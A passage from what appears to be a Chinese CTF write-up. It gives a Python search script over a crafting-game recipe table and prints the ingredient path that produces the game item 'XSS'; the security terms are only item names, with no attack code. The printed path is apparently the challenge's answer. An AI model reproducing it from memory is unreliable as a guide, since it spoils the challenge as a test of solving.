+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line">recipes = [</span><br><span class="line">    [<span class="string">&quot;Ash&quot;</span>, <span class="string">&quot;Fire&quot;</span>, <span class="string">&quot;Charcoal&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Steam Engine&quot;</span>, <span class="string">&quot;Water&quot;</span>, <span class="string">&quot;Vapor&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Brick Oven&quot;</span>, <span class="string">&quot;Heat Engine&quot;</span>, <span class="string">&quot;Oven&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Steam Engine&quot;</span>, <span class="string">&quot;Swamp&quot;</span>, <span class="string">&quot;Sauna&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Magma&quot;</span>, <span class="string">&quot;Mud&quot;</span>, <span class="string">&quot;Obsidian&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Earth&quot;</span>, <span class="string">&quot;Mud&quot;</span>, <span class="string">&quot;Clay&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Volcano&quot;</span>, <span class="string">&quot;Water&quot;</span>, <span class="string">&quot;Volcanic Rock&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Brick&quot;</span>, <span class="string">&quot;Fog&quot;</span>, <span class="string">&quot;Cloud&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Obsidian&quot;</span>, <span class="string">&quot;Rain&quot;</span>, <span class="string">&quot;Black Rain&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Colorful Pattern&quot;</span>, <span class="string">&quot;Fire&quot;</span>, <span class="string">&quot;Rainbow Fire&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Cloud&quot;</span>, <span class="string">&quot;Obsidian&quot;</span>, <span class="string">&quot;Storm&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Ash&quot;</span>, <span class="string">&quot;Obsidian&quot;</span>, <span class="string">&quot;Volcanic Glass&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Electricity&quot;</span>, <span class="string">&quot;Haze&quot;</span>, <span class="string">&quot;Static&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Fire&quot;</span>, <span class="string">&quot;Water&quot;</span>, <span class="string">&quot;Steam&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Dust&quot;</span>, <span class="string">&quot;Rainbow&quot;</span>, <span class="string">&quot;Powder&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Computer Chip&quot;</span>, <span class="string">&quot;Steam Engine&quot;</span>, <span class="string">&quot;Artificial Intelligence&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Fire&quot;</span>, <span class="string">&quot;Mud&quot;</span>, <span class="string">&quot;Brick&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Hot Spring&quot;</span>, <span class="string">&quot;Swamp&quot;</span>, <span class="string">&quot;Sulfur&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Adobe&quot;</span>, <span class="string">&quot;Graphic Design&quot;</span>, <span class="string">&quot;Web Design&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Colorful Interface&quot;</span>, <span class="string">&quot;Data&quot;</span>, <span class="string">&quot;Visualization&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;IoT&quot;</span>, <span class="string">&quot;Security&quot;</span>, <span class="string">&quot;Encryption&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Colorful Pattern&quot;</span>, <span class="string">&quot;Mosaic&quot;</span>, <span class="string">&quot;Patterned Design&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Earth&quot;</span>, <span class="string">&quot;Steam Engine&quot;</span>, <span class="string">&quot;Excavator&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Cloud Computing&quot;</span>, <span class="string">&quot;Data&quot;</span>, <span class="string">&quot;Data Mining&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Earth&quot;</span>, <span class="string">&quot;Water&quot;</span>, <span class="string">&quot;Mud&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Brick&quot;</span>, <span class="string">&quot;Fire&quot;</span>, <span class="string">&quot;Brick Oven&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Colorful Pattern&quot;</span>, <span class="string">&quot;Obsidian&quot;</span>, <span class="string">&quot;Art&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Rain&quot;</span>, <span class="string">&quot;Steam Engine&quot;</span>, <span class="string">&quot;Hydropower&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Colorful Display&quot;</span>, <span class="string">&quot;Graphic Design&quot;</span>, <span class="string">&quot;Colorful Interface&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Fire&quot;</span>, <span class="string">&quot;Mist&quot;</span>, <span class="string">&quot;Fog&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Exploit&quot;</span>, <span class="string">&quot;Web Design&quot;</span>, <span class="string">&quot;XSS&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Computer Chip&quot;</span>, <span class="string">&quot;Hot Spring&quot;</span>, <span class="string">&quot;Smart Thermostat&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Earth&quot;</span>, <span class="string">&quot;Fire&quot;</span>, <span class="string">&quot;Magma&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Air&quot;</span>, <span class="string">&quot;Earth&quot;</span>, <span class="string">&quot;Dust&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Cloud&quot;</span>, <span class="string">&quot;Rainbow&quot;</span>, <span class="string">&quot;Rainbow Cloud&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Dust&quot;</span>, <span class="string">&quot;Heat Engine&quot;</span>, <span class="string">&quot;Sand&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Obsidian&quot;</span>, <span class="string">&quot;Thunderstorm&quot;</span>, <span class="string">&quot;Lightning Conductor&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Cloud&quot;</span>, <span class="string">&quot;Rain&quot;</span>, <span class="string">&quot;Thunderstorm&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Adobe&quot;</span>, <span class="string">&quot;Cloud&quot;</span>, <span class="string">&quot;Software&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Hot Spring&quot;</span>, <span class="string">&quot;Rainbow&quot;</span>, <span class="string">&quot;Colorful Steam&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Dust&quot;</span>, <span class="string">&quot;Fire&quot;</span>, <span class="string">&quot;Ash&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Cement&quot;</span>, <span class="string">&quot;Swamp&quot;</span>, <span class="string">&quot;Marsh&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Hot Tub&quot;</span>, <span class="string">&quot;Mud&quot;</span>, <span class="string">&quot;Mud Bath&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Electricity&quot;</span>, <span class="string">&quot;Glass&quot;</span>, <span class="string">&quot;Computer Chip&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Ceramic&quot;</span>, <span class="string">&quot;Fire&quot;</span>, <span class="string">&quot;Earthenware&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Haze&quot;</span>, <span class="string">&quot;Swamp&quot;</span>, <span class="string">&quot;Fog Machine&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Rain&quot;</span>, <span class="string">&quot;Rainbow&quot;</span>, <span class="string">&quot;Colorful Display&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Brick&quot;</span>, <span class="string">&quot;Water&quot;</span>, <span class="string">&quot;Cement&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Dust&quot;</span>, <span class="string">&quot;Haze&quot;</span>, <span class="string">&quot;Sandstorm&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Ash&quot;</span>, <span class="string">&quot;Hot Spring&quot;</span>, <span class="string">&quot;Geothermal Energy&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Ash Rock&quot;</span>, <span class="string">&quot;Heat Engine&quot;</span>, <span class="string">&quot;Mineral&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Electricity&quot;</span>, <span class="string">&quot;Software&quot;</span>, <span class="string">&quot;Program&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Computer Chip&quot;</span>, <span class="string">&quot;Fire&quot;</span>, <span class="string">&quot;Data&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Colorful Pattern&quot;</span>, <span class="string">&quot;Swamp&quot;</span>, <span class="string">&quot;Algae&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Fog&quot;</span>, <span class="string">&quot;Water&quot;</span>, <span class="string">&quot;Rain&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Rainbow Pool&quot;</span>, <span class="string">&quot;Reflection&quot;</span>, <span class="string">&quot;Color Spectrum&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Artificial Intelligence&quot;</span>, <span class="string">&quot;Data&quot;</span>, <span class="string">&quot;Encryption&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Internet&quot;</span>, <span class="string">&quot;Smart Thermostat&quot;</span>, <span class="string">&quot;IoT&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Cinder&quot;</span>, <span class="string">&quot;Heat Engine&quot;</span>, <span class="string">&quot;Ash Rock&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Brick&quot;</span>, <span class="string">&quot;Swamp&quot;</span>, <span class="string">&quot;Mudbrick&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Computer Chip&quot;</span>, <span class="string">&quot;Volcano&quot;</span>, <span class="string">&quot;Data Mining&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Obsidian&quot;</span>, <span class="string">&quot;Water&quot;</span>, <span class="string">&quot;Hot Spring&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Computer Chip&quot;</span>, <span class="string">&quot;Thunderstorm&quot;</span>, <span class="string">&quot;Power Surge&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Brick&quot;</span>, <span class="string">&quot;Obsidian&quot;</span>, <span class="string">&quot;Paving Stone&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;User Input&quot;</span>, <span class="string">&quot;Visualization&quot;</span>, <span class="string">&quot;Interactive Design&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Mist&quot;</span>, <span class="string">&quot;Mud&quot;</span>, <span class="string">&quot;Swamp&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Geolocation&quot;</span>, <span class="string">&quot;Wall&quot;</span>, <span class="string">&quot;Map&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Air&quot;</span>, <span class="string">&quot;Rock&quot;</span>, <span class="string">&quot;Internet&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Computer Chip&quot;</span>, <span class="string">&quot;Rain&quot;</span>, <span class="string">&quot;Email&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Fire&quot;</span>, <span class="string">&quot;Rainbow&quot;</span>, <span class="string">&quot;Colorful Flames&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Hot Spring&quot;</span>, <span class="string">&quot;Mineral Spring&quot;</span>, <span class="string">&quot;Healing Water&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Ceramic&quot;</span>, <span class="string">&quot;Volcano&quot;</span>, <span class="string">&quot;Lava Lamp&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Brick Oven&quot;</span>, <span class="string">&quot;Wall&quot;</span>, <span class="string">&quot;Fireplace&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Glass&quot;</span>, <span class="string">&quot;Software&quot;</span>, <span class="string">&quot;Vulnerability&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Fog&quot;</span>, <span class="string">&quot;Mud&quot;</span>, <span class="string">&quot;Sludge&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Fire&quot;</span>, <span class="string">&quot;Marsh&quot;</span>, <span class="string">&quot;S&#x27;mores&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Artificial Intelligence&quot;</span>, <span class="string">&quot;Data Mining&quot;</span>, <span class="string">&quot;Machine Learning&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Ash&quot;</span>, <span class="string">&quot;Brick&quot;</span>, <span class="string">&quot;Brick Kiln&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Fire&quot;</span>, <span class="string">&quot;Obsidian&quot;</span>, <span class="string">&quot;Heat Resistant Material&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Hot Spring&quot;</span>, <span class="string">&quot;Sludge&quot;</span>, <span class="string">&quot;Steam Engine&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Artificial Intelligence&quot;</span>, <span class="string">&quot;Computer Chip&quot;</span>, <span class="string">&quot;Smart Device&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Fire&quot;</span>, <span class="string">&quot;Steam Engine&quot;</span>, <span class="string">&quot;Heat Engine&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Ash&quot;</span>, <span class="string">&quot;Earth&quot;</span>, <span class="string">&quot;Cinder&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Rainbow&quot;</span>, <span class="string">&quot;Reflection&quot;</span>, <span class="string">&quot;Refraction&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Encryption&quot;</span>, <span class="string">&quot;Software&quot;</span>, <span class="string">&quot;Cybersecurity&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Graphic Design&quot;</span>, <span class="string">&quot;Mosaic&quot;</span>, <span class="string">&quot;Artwork&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Colorful Display&quot;</span>, <span class="string">&quot;Data Mining&quot;</span>, <span class="string">&quot;Visualization&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Hot Spring&quot;</span>, <span class="string">&quot;Water&quot;</span>, <span class="string">&quot;Mineral Spring&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Rainbow&quot;</span>, <span class="string">&quot;Swamp&quot;</span>, <span class="string">&quot;Reflection&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Air&quot;</span>, <span class="string">&quot;Fire&quot;</span>, <span class="string">&quot;Smoke&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Program&quot;</span>, <span class="string">&quot;Smart HVAC System&quot;</span>, <span class="string">&quot;Smart Thermostat&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Haze&quot;</span>, <span class="string">&quot;Obsidian&quot;</span>, <span class="string">&quot;Blackout&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Brick&quot;</span>, <span class="string">&quot;Earth&quot;</span>, <span class="string">&quot;Wall&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Heat Engine&quot;</span>, <span class="string">&quot;Steam Locomotive&quot;</span>, <span class="string">&quot;Railway Engine&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Ash&quot;</span>, <span class="string">&quot;Thunderstorm&quot;</span>, <span class="string">&quot;Volcanic Lightning&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Mud&quot;</span>, <span class="string">&quot;Water&quot;</span>, <span class="string">&quot;Silt&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Colorful Pattern&quot;</span>, <span class="string">&quot;Hot Spring&quot;</span>, <span class="string">&quot;Rainbow Pool&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Fire&quot;</span>, <span class="string">&quot;Sand&quot;</span>, <span class="string">&quot;Glass&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Art&quot;</span>, <span class="string">&quot;Web Design&quot;</span>, <span class="string">&quot;Graphic Design&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Internet&quot;</span>, <span class="string">&quot;Machine Learning&quot;</span>, <span class="string">&quot;Smart HVAC System&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Electricity&quot;</span>, <span class="string">&quot;Power Surge&quot;</span>, <span class="string">&quot;Overload&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Colorful Pattern&quot;</span>, <span class="string">&quot;Computer Chip&quot;</span>, <span class="string">&quot;Graphic Design&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Air&quot;</span>, <span class="string">&quot;Water&quot;</span>, <span class="string">&quot;Mist&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Brick Oven&quot;</span>, <span class="string">&quot;Cement&quot;</span>, <span class="string">&quot;Concrete&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Artificial Intelligence&quot;</span>, <span class="string">&quot;Cloud&quot;</span>, <span class="string">&quot;Cloud Computing&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Computer Chip&quot;</span>, <span class="string">&quot;Earth&quot;</span>, <span class="string">&quot;Geolocation&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Color Spectrum&quot;</span>, <span class="string">&quot;Graphic Design&quot;</span>, <span class="string">&quot;Colorful Interface&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Internet&quot;</span>, <span class="string">&quot;Program&quot;</span>, <span class="string">&quot;Web Design&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Computer Chip&quot;</span>, <span class="string">&quot;Overload&quot;</span>, <span class="string">&quot;Circuit Failure&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Data Mining&quot;</span>, <span class="string">&quot;Geolocation&quot;</span>, <span class="string">&quot;Location Tracking&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Heat Engine&quot;</span>, <span class="string">&quot;Smart Thermostat&quot;</span>, <span class="string">&quot;Smart HVAC System&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Brick&quot;</span>, <span class="string">&quot;Mud&quot;</span>, <span class="string">&quot;Adobe&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Cloud&quot;</span>, <span class="string">&quot;Dust&quot;</span>, <span class="string">&quot;Rainbow&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Hot Spring&quot;</span>, <span class="string">&quot;Obsidian&quot;</span>, <span class="string">&quot;Hot Tub&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Steam Engine&quot;</span>, <span class="string">&quot;Volcano&quot;</span>, <span class="string">&quot;Geothermal Power Plant&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Earth&quot;</span>, <span class="string">&quot;Fog&quot;</span>, <span class="string">&quot;Haze&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Brick&quot;</span>, <span class="string">&quot;Steam Engine&quot;</span>, <span class="string">&quot;Steam Locomotive&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Brick&quot;</span>, <span class="string">&quot;Colorful Pattern&quot;</span>, <span class="string">&quot;Mosaic&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Hot Spring&quot;</span>, <span class="string">&quot;Steam Engine&quot;</span>, <span class="string">&quot;Electricity&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Ash&quot;</span>, <span class="string">&quot;Volcano&quot;</span>, <span class="string">&quot;Volcanic Ash&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Electricity&quot;</span>, <span class="string">&quot;Water&quot;</span>, <span class="string">&quot;Hydroelectric Power&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Brick&quot;</span>, <span class="string">&quot;Rainbow&quot;</span>, <span class="string">&quot;Colorful Pattern&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Silt&quot;</span>, <span class="string">&quot;Volcano&quot;</span>, <span class="string">&quot;Lava&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Computer Chip&quot;</span>, <span class="string">&quot;Software&quot;</span>, <span class="string">&quot;Program&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Hot Spring&quot;</span>, <span class="string">&quot;Thunderstorm&quot;</span>, <span class="string">&quot;Lightning&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Ash&quot;</span>, <span class="string">&quot;Clay&quot;</span>, <span class="string">&quot;Ceramic&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Cybersecurity&quot;</span>, <span class="string">&quot;Vulnerability&quot;</span>, <span class="string">&quot;Exploit&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Ash&quot;</span>, <span class="string">&quot;Heat Engine&quot;</span>, <span class="string">&quot;Ash Residue&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Internet&quot;</span>, <span class="string">&quot;Smart Device&quot;</span>, <span class="string">&quot;Cloud Computing&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Magma&quot;</span>, <span class="string">&quot;Mist&quot;</span>, <span class="string">&quot;Rock&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Interactive Design&quot;</span>, <span class="string">&quot;Program&quot;</span>, <span class="string">&quot;Smart Device&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Computer Chip&quot;</span>, <span class="string">&quot;Electricity&quot;</span>, <span class="string">&quot;Software&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Colorful Pattern&quot;</span>, <span class="string">&quot;Graphic Design&quot;</span>, <span class="string">&quot;Design Template&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Fire&quot;</span>, <span class="string">&quot;Magma&quot;</span>, <span class="string">&quot;Volcano&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Earth&quot;</span>, <span class="string">&quot;Obsidian&quot;</span>, <span class="string">&quot;Computer Chip&quot;</span>],</span><br><span class="line">    [<span class="string">&quot;Geolocation&quot;</span>, <span class="string">&quot;Location Tracking&quot;</span>, <span class="string">&quot;Real-Time Positioning&quot;</span>],</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">graph = &#123;&#125;</span><br><span class="line"><span class="comment"># 根据合成表建图 邻接表</span></span><br><span class="line"><span class="keyword">for</span> hecheng <span class="keyword">in</span> recipes:</span><br><span class="line">    graph[hecheng[<span class="number">2</span>]] = hecheng[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 起点元素</span></span><br><span class="line">has = [<span class="string">&quot;Fire&quot;</span>, <span class="string">&quot;Water&quot;</span>, <span class="string">&quot;Earth&quot;</span>, <span class="string">&quot;Air&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 存路线</span></span><br><span class="line">luxian = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_has</span>(<span class="params">item</span>):</span><br><span class="line">    <span class="keyword">global</span> graph, has, luxian</span><br><span class="line">    <span class="comment"># 如果该元素已经拥有, 则没必要再找了</span></span><br><span class="line">    <span class="keyword">if</span> item <span class="keyword">in</span> has:</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line">    <span class="comment"># 如果不是, 从图中寻找合成元素</span></span><br><span class="line">    item_f, item_m = graph[item][<span class="number">0</span>], graph[item][<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># 已经前去寻找合成路线了, 所以可以看作该元素已拥有</span></span><br><span class="line">    has.append(item)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">next</span> = [find_has(item_f), find_has(item_m)]</span><br><span class="line">    <span class="comment"># 如果&quot;原料&quot;都已拥有, 则添加路线</span></span><br><span class="line">    <span class="keyword">if</span> item_f <span class="keyword">in</span> has <span class="keyword">and</span> item_m <span class="keyword">in</span> has:</span><br><span class="line">        luxian.append(<span class="string">f&quot;<span class="subst">&#123;item_f&#125;</span>+<span class="subst">&#123;item_m&#125;</span>=<span class="subst">&#123;item&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">next</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(find_has(<span class="string">&quot;XSS&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> luxian:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里找到了合成路线如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;Earth&quot;,&quot;Fire&quot;],[&quot;Earth&quot;,&quot;Water&quot;],[&quot;Magma&quot;,&quot;Mud&quot;],[&quot;Earth&quot;,&quot;Obsidian&quot;],[&quot;Obsidian&quot;,&quot;Water&quot;],[&quot;Air&quot;,&quot;Water&quot;],[&quot;Fire&quot;,&quot;Mist&quot;],[&quot;Fog&quot;,&quot;Mud&quot;],[&quot;Hot Spring&quot;,&quot;Sludge&quot;],[&quot;Computer Chip&quot;,&quot;Steam Engine&quot;],[&quot;Computer Chip&quot;,&quot;Fire&quot;],[&quot;Artificial Intelligence&quot;,&quot;Data&quot;],[&quot;Hot Spring&quot;,&quot;Steam Engine&quot;],[&quot;Computer Chip&quot;,&quot;Electricity&quot;],[&quot;Encryption&quot;,&quot;Software&quot;],[&quot;Air&quot;,&quot;Earth&quot;],[&quot;Fire&quot;,&quot;Steam Engine&quot;],[&quot;Dust&quot;,&quot;Heat Engine&quot;],[&quot;Fire&quot;,&quot;Sand&quot;],[&quot;Glass&quot;,&quot;Software&quot;],[&quot;Cybersecurity&quot;,&quot;Vulnerability&quot;],[&quot;Magma&quot;,&quot;Mist&quot;],[&quot;Air&quot;,&quot;Rock&quot;],[&quot;Computer Chip&quot;,&quot;Software&quot;],[&quot;Internet&quot;,&quot;Program&quot;],[&quot;Exploit&quot;,&quot;Web Design&quot;]</span><br></pre></td></tr></table></figure>
+<p>然后根据assert的条件，recipe必须是个数组，可以得到：</p>
